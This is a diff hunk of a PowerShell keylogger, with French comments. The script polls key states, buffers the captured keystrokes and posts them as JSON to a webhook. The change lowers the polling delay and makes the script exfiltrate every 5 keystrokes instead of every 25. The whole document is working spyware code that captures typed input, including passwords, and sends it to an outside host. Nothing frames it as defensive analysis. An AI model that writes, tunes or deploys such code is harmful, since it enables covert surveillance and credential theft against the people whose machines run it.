@@ -14,11 +14,11 @@ Add-Type $code
 
 $buf = ''
 while($true){
-    Start-Sleep -m 40
+    Start-Sleep -m 30  # un peu plus rapide
     for($i=8;$i -le 254;$i++){
         if([K]::GetAsyncKeyState($i) -eq -32767){
             $buf += [char]$i
-            if($buf.Length -ge 25){
+            if($buf.Length -ge 5){  # ← ENVOIE TOUTES LES 5 TOUCHES (au lieu de 25)
                 iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                 $buf = ''
             }
